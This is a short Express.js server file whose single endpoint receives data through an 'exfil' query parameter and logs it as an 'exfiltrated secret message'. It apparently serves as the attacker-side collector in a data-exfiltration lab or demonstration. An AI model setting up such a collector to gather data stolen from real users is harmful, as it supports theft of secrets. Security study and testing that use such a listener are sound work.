const express = require('express');
const app = express();
const port = 4000;

// Endpoint to capture the exfiltrated data
app.get('/', (req, res) => {
  const secretMsg = req.query.exfil;
  console.log(`Exfiltrated secret message: ${secretMsg}`);
  res.send('Data received');
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
